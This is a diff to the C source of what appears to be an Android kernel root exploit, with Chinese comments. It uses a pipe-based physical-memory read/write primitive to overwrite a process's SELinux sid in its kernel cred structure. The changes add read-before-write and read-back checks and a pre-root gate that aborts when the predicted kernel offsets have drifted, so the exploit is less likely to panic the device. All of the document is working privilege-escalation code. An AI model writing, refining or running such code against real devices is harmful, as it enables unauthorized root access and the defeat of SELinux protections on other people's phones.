@@ -226,12 +226,41 @@ int patch_cred_sid(int fd, uintptr_t cred) {
     return 0;
   }
 
+  /* Panic-safe: 写入前读取当前 osid/sid, 确认偏移落在合理的 selinux blob 上
+   * 合理的 sid 是非零正整数 (SELINUX_KERNEL_SID=1, 普通进程 sid 通常 < 65536).
+   * 若读得 0 或 0xffffffff, 说明 CRED_SECURITY_OFF / SELINUX_CRED_BLOB_OFF 漂移.
+   */
+  uintptr_t sid_addr =
+    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
+  uint32_t osid_before = pipe_read32(fd, sid_addr);
+  uint32_t sid_before = pipe_read32(fd, sid_addr + 4);
+  if (osid_before == 0 || osid_before == 0xffffffff ||
+      sid_before == 0 || sid_before == 0xffffffff) {
+    pr_info("root bad cred sid before-write cred=%016llx security=%016llx "
+            "osid=%08x sid=%08x (offset drift suspected)\n",
+            (unsigned long long)cred, (unsigned long long)security,
+            osid_before, sid_before);
+    return 0;
+  }
+
   uint32_t sid_pair[2] = {
     target_cred_osid, target_cred_sid,
   };
-  uintptr_t osid_addr =
-    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
-  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
+  if (!pipe_phys_write_data(fd, sid_addr, sid_pair, sizeof(sid_pair))) {
+    return 0;
+  }
+
+  /* Panic-safe: 写入后回读验证, 确认 sid 已成功改写 */
+  uint32_t osid_after = pipe_read32(fd, sid_addr);
+  uint32_t sid_after = pipe_read32(fd, sid_addr + 4);
+  if (osid_after != target_cred_osid || sid_after != target_cred_sid) {
+    pr_info("root cred sid verify failed cred=%016llx osid=%08x/%08x "
+            "sid=%08x/%08x\n",
+            (unsigned long long)cred, osid_before, osid_after,
+            sid_before, sid_after);
+    return 0;
+  }
+  return 1;
 }
 
 int patch_cred_object(int fd, uintptr_t cred) {
@@ -299,6 +328,25 @@ int install_android_root(int fd) {
   root_uid_before = getuid();
   if (!spawn_root_child()) {
     pr_info("root spawn failed child=%d\n", root_child_pid);
+    return 0;
+  }
+
+  /* Panic-safe 闸门: pipe physrw 已就绪, 但写入内核数据结构前最后校验
+   * 所有目标地址可读 + 语义合理. 任一失败都放弃 root 改写, 避免
+   * 203 预测偏移漂移导致 cred/task_struct/security_hook_heads 写坏 -> panic.
+   * 失败信息记录在 g_offset_drift_item, 供 main.c exploit_summary 打印.
+   */
+  if (!robustness_pre_root_check(fd)) {
+    pr_warning("root: pre-root-gate failed (first=%s) — "
+               "aborting writes to avoid kernel panic\n",
+               g_offset_drift_item);
+    /* 通知 root_child 不要再等待 go 信号, 直接退出 */
+    atomic_store(&root_shared->go, 1);
+    usleep(50000);
+    if (root_child_pid > 0) {
+      kill(root_child_pid, SIGKILL);
+      waitpid(root_child_pid, NULL, 0);
+    }
     return 0;
   }
 
